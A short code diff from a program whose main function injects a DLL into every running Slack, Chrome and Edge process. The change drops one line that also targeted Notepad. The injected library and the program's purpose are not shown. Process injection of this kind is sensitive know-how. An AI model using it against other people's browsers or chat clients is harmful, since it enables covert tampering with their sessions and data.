@@ -152,7 +152,6 @@ int main() {
     InjectIntoAll(L"Slack.exe", dllPath);
     InjectIntoAll(L"chrome.exe", dllPath);
     InjectIntoAll(L"msedge.exe", dllPath);
-    InjectIntoAll(L"notepad.exe", dllPath);
 
     system("pause");
     return 0;
